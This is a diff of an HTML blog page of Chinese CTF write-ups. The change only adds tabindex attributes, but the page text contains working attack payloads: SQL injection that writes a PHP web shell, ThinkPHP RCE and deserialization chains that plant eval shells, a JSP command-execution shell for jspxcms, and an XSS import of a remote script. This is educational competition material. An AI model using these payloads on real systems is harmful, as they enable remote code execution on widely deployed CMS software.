@@ -11,14 +11,14 @@
 &lt;p>但是版本也太新了吧8.1.1，弱口令也没有，抓包可以看到它在不停的请求各种api，其中有个/api/ds/query，以明文方式请求数据库内容&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005705121.png" alt="image-20210818005705121">&lt;/p>
 &lt;p>那这就好说了，直接明牌了都&lt;/p>
-&lt;pre>&lt;code>SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';
+&lt;pre tabindex="0">&lt;code>SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';
 SELECT * FROM flags;
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818011913101.png" alt="image-20210818011913101">&lt;/p>
 &lt;p>————这个故事告诉我们对于权限的设置是很重要的，不要随便把api接口暴露出来，也不要明文传递信息&lt;/p>
 &lt;h2 id="webreally-awesome-hidden-service">Web/Really Awesome Hidden Service&lt;/h2>
 &lt;blockquote>
 &lt;p>Ahoy, matey! Some dirty scallywags seem to not be respectin' th' pirate code! Teach them a lesson by findin' out who they be.&lt;/p>
-&lt;pre>&lt;code>ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion
+&lt;pre tabindex="0">&lt;code>ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion
 &lt;/code>&lt;/pre>&lt;/blockquote>
 &lt;p>一个Tor的网站，走匿名方式&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818014430572.png" alt="image-20210818014430572">&lt;/p>
@@ -446,7 +446,7 @@ df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal
 &lt;p>emmmm 但是这里不管是明文还是url encode都会有500错误，而且这里返回的时&lt;code>correct_password[0][0]==password&lt;/code>，也算是杜绝了这种多添加一条信息的可能，之前已经初始化的密码会是&lt;code>[0][0]&lt;/code>，而新插入的passwd将是&lt;code>[1][0]&lt;/code>；并且在&lt;code>init()&lt;/code>时定义username是primary 也不可能有重复的&lt;/p>
 &lt;p>————比赛的时候就停到这里了，也是当时了解的太少，思路很容易就断掉了。。。以下是复现&lt;/p>
 &lt;p>在看了&lt;a href="https://github.com/Muirey03/redpwn2021_writeups/blob/master/web_cool.md">这篇wp&lt;/a>之后，发现这位师傅最开始跟我的思路是一样的 都想利用insert那一句，都想替换掉数据库中原来存有的ginkoid的密码；这位师傅用的payload是&lt;/p>
-&lt;pre>&lt;code>'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';--
+&lt;pre tabindex="0">&lt;code>'),('ginkoid','') ON CONFLICT DO UPDATE SET password='';--
 &lt;/code>&lt;/pre>&lt;p>其中的&lt;code>ON CONFLICT DO UPDATE SET&lt;/code>，在&lt;a href="https://www.sqlite.org/lang_UPSERT.html">这篇官方文档&lt;/a>里写的很详细，这位师傅给的payload很好（我当时则对这个sql语句并不清楚）但是正如他所说的，which is 8 characters over the limit, which won&amp;rsquo;t do.&lt;/p>
 &lt;p>最后使用盲注的方式，先上一下脚本 （&lt;a href="https://github.com/SuperStormer/writeups/blob/master/redpwnctf_2021/web/cool.py">这里是来源&lt;/a>）再说说思路&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
@@ -550,7 +550,7 @@ df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal
 &lt;p>我们利用的就是浏览器解析html的部分，可以让不相关的几个notes拼接在一起（举个简单的栗子：在一个note里面用&lt;code>&amp;lt;p&amp;gt;&lt;/code> 另一个里面放&lt;code>&amp;lt;/p&amp;gt;&lt;/code>，中间的部分会被放在一起）这里选用的是&lt;code>&amp;lt;style&amp;gt;&lt;/code>这个tag，利用它onload的属性&lt;/p>
 &lt;p>还有一个待解决的问题是上下两个notes之间会有&lt;code>&amp;lt;div class=&amp;quot;card&amp;quot;&amp;gt;&lt;/code>的存在；这也是不用&lt;code>&amp;lt;iframe&amp;gt;&lt;/code>和它的onload属性的原因，因为浏览器是不允许&lt;code>&amp;lt;iframe&amp;gt;&lt;/code>中属性换行的&lt;/p>
 &lt;p>我们最终的payload&lt;/p>
-&lt;pre>&lt;code>body: anything
+&lt;pre tabindex="0">&lt;code>body: anything
 tag: &amp;lt;style a='
 body: anything
 tag: 'onload='`
@@ -1005,7 +1005,7 @@ $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c
 &lt;span style="color:#111">}&lt;/span>
 &lt;span style="color:#111">})();&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>为了引入这个脚本，我们新建一个paste&lt;/p>
-&lt;pre>&lt;code>${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)}
+&lt;pre tabindex="0">&lt;code>${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)}
 &lt;/code>&lt;/pre>&lt;p>其他几个版本的脚本：&lt;a href="https://gist.github.com/parrot409/6782796ba9be2088a57a679c27f4e037">ver2&lt;/a> &lt;a href="https://gist.github.com/maple3142/10e3d6f03e307016e54e7f9b6073214a">ver3&lt;/a>&lt;/p>
 &lt;p>参考：&lt;a href="https://xsleaks.dev/">XSLeaks&lt;/a> | &lt;a href="https://owasp.org/www-pdf-archive/Side_Channel_Vulnerabilities.pdf">Side Channel Vulnerabilities on the Web - Detection and Preventio&lt;/a> | &lt;a href="https://dormousehole.readthedocs.io/en/latest/patterns/flashing.html">Flask 消息闪现&lt;/a>&lt;/p>
 &lt;h2 id="webwtjs">web/wtjs&lt;/h2>
@@ -1071,13 +1071,13 @@ $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c
 &lt;p>&lt;code>nc mc.ax 31845&lt;/code>&lt;/p>
 &lt;/blockquote>
 &lt;p>nc连入后没有任何可视的回显，但是藏在了声音信息里&lt;/p>
-&lt;pre>&lt;code>\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00
+&lt;pre tabindex="0">&lt;code>\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00
 &lt;/code>&lt;/pre>&lt;p>导出，有两种值：no bell(\x00) bell(\x07)，转化为0与1&lt;/p>
-&lt;pre>&lt;code>101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000
+&lt;pre tabindex="0">&lt;code>101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000
 &lt;/code>&lt;/pre>&lt;p>改为莫斯电码的样子&lt;/p>
-&lt;pre>&lt;code>.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.-
+&lt;pre tabindex="0">&lt;code>.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.-
 &lt;/code>&lt;/pre>&lt;p>解密&lt;/p>
-&lt;pre>&lt;code>LETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L)
+&lt;pre tabindex="0">&lt;code>LETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L)
 &lt;/code>&lt;/pre>&lt;p>&lt;code>flag{d1ng-d0n9-g0es-th3-anna-b3l}&lt;/code>&lt;/p>
 &lt;h2 id="cryptoscissor">crypto/scissor&lt;/h2>
 &lt;blockquote>
@@ -1090,7 +1090,7 @@ $ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c
 &lt;p>I want to do an RSA!&lt;/p>
 &lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/aaa49d90f7e2f6dda3ed8476879729955fefd68130dbc678e7d872dc2bcd825b/output.txt">output.txt&lt;/a>&lt;/p>
 &lt;/blockquote>
-&lt;pre>&lt;code>n: 228430203128652625114739053365339856393
+&lt;pre tabindex="0">&lt;code>n: 228430203128652625114739053365339856393
 e: 65537
 c: 126721104148692049427127809839057445790
 &lt;/code>&lt;/pre>&lt;p>&lt;del>一点都不会crypto……&lt;/del> 其实查一下&lt;code>RSA n e c&lt;/code>其实就能做出来后面的东西了&lt;/p>
@@ -1114,7 +1114,7 @@ c: 126721104148692049427127809839057445790
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710154321719.png" alt="image-20210710154321719">&lt;/p>
 &lt;p>参考：&lt;a href="https://github.com/dudnamedcyan/Redpwn2021_Writeup/blob/main/rev/bread-making.md">wp2&lt;/a> &lt;a href="https://codingmace.gitbook.io/masterward/ctf/2021/redpwn-2021#bread-making">wp3&lt;/a> &lt;a href="https://www.notion.so/bread-making-SOLVED-5cb97be799fc4fee8cd97738a9141713">wp4&lt;/a>&lt;/p>
 &lt;p>我当时的思路和想法大致还是对的，~~（虽然没有做出来吧）~~这个就是先提取出文件中的字符串部分，然后用逻辑 在交互模式下用正确的顺序输入 完整的顺下来这个流程，最后拿到flag，最后的正确顺序是这样的&lt;/p>
-&lt;pre>&lt;code>add ingredients to the bowl
+&lt;pre tabindex="0">&lt;code>add ingredients to the bowl
 add flour
 add yeast
 add salt
@@ -1139,7 +1139,7 @@ brush teeth and go to bed
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716181440958.png" alt="image-20210716181440958">&lt;/p>
 &lt;p>The flag is: &lt;code>flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}&lt;/code>&lt;/p>
 &lt;p>调试的过程是linux下的py脚本&lt;/p>
-&lt;pre>&lt;code>from pwn import *
+&lt;pre tabindex="0">&lt;code>from pwn import *
 p = remote(&amp;quot;mc.ax&amp;quot;, 31796)
 p.sendlineafter(&amp;quot;bowl&amp;quot;, &amp;quot;add flour&amp;quot;)
 p.sendlineafter(&amp;quot;flour has been added&amp;quot;, &amp;quot;add yeast&amp;quot;)
@@ -1226,11 +1226,11 @@ cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;
 &lt;p>easythinkphp&lt;/p>
 &lt;/blockquote>
 &lt;p>只有一个thinkphp 3.2.3的欢迎页面，tp的洞很多 可以直接拿来打，参考：&lt;a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">【漏洞通报】ThinkPHP3.2.x RCE漏洞通报&lt;/a>&lt;/p>
-&lt;pre>&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=phpinfo();?&amp;gt;
+&lt;pre tabindex="0">&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=phpinfo();?&amp;gt;
 /index.php?m=Home&amp;amp;c=Index&amp;amp;a=index&amp;amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801011103992.png" alt="image-20210801011103992">&lt;/p>
 &lt;p>先验证一下文档中的方法，成功，之后把phpinfo换成自己的一句话木马&lt;/p>
-&lt;pre>&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=eval($_POST['wuhu']);?&amp;gt;
+&lt;pre tabindex="0">&lt;code>/index.php?m=--&amp;gt;&amp;lt;?=eval($_POST['wuhu']);?&amp;gt;
 &lt;/code>&lt;/pre>&lt;p>传入后 用蚁剑连接就能拿flag了~&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801012307515.png" alt="image-20210801012307515">&lt;/p>
 &lt;p>或者也可以直接使用&lt;a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.2">ThinkphpGUI&lt;/a>一把梭！一键getshell 你值得拥有&lt;/p>
@@ -1238,7 +1238,7 @@ cat &lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">cd&lt;
 &lt;h2 id="jspxcms">jspxcms&lt;/h2>
 &lt;p>也有现成的洞可以直接用，参考：&lt;a href="https://lockcy.github.io/2019/10/18/%E5%A4%8D%E7%8E%B0jspxcms%E8%A7%A3%E5%8E%8Bgetshell%E6%BC%8F%E6%B4%9E/">复现jspxcms解压getshell漏洞&lt;/a> | &lt;a href="https://www.shengchulai.com/blog-NJwAv8oZV1.htm">代码审计| Jspxcms文件上传漏洞(CNVD-2019-40540)&lt;/a> | &lt;a href="https://www.anquanke.com/post/id/188788">记一次由追踪溯源发现的“不安全解压getshell”&lt;/a>&lt;/p>
 &lt;p>首先构造含jsp🐎的恶意war包，🐎长这样&lt;/p>
-&lt;pre>&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%
+&lt;pre tabindex="0">&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%
 if(&amp;quot;023&amp;quot;.equals(request.getParameter(&amp;quot;pwd&amp;quot;))){
 java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&amp;quot;wuhu&amp;quot;)).getInputStream();
 int a = -1;
@@ -1285,10 +1285,10 @@ out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
 &lt;p>在admin后加单引号，提示&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801113627407.png" alt="image-20210801113627407">&lt;/p>
 &lt;p>表名是bees_admin，有id, admin_name, admin_password, admin_purview, is_disable共5个字段&lt;/p>
 &lt;p>简单fuzz可知：过滤了空格（用&lt;code>/**/&lt;/code>绕过）（或者用&lt;code>tab&lt;/code>绕过 或者&lt;code>%0a&lt;/code>绕过 都可以），过滤了select, outfile（双写绕过），对尖括号转义为html实体（用hex绕过）&lt;/p>
-&lt;pre>&lt;code>user=admin'/**/union/**/selselectect/**/1,2,3,4,5#
+&lt;pre tabindex="0">&lt;code>user=admin'/**/union/**/selselectect/**/1,2,3,4,5#
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121138555.png" alt="image-20210801121138555">&lt;/p>
 &lt;p>回显正常，接着尝试写入shell（这里要写清楚绝对路径，在上面的一张报错的页面也有所提示了）&lt;/p>
-&lt;pre>&lt;code>admin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'#
+&lt;pre tabindex="0">&lt;code>admin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'#
 &lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121645243.png" alt="image-20210801121645243">&lt;/p>
 &lt;p>好耶，连蚁剑拿flag咯&lt;/p>
 &lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210801121853464.png" alt="image-20210801121853464">&lt;/p>
@@ -1404,7 +1404,7 @@ out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);
 &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$window&lt;/span>&lt;span style="color:#111">));&lt;/span>
 &lt;span style="color:#111">}&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>上传&lt;/p>
-&lt;pre>&lt;code>/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D
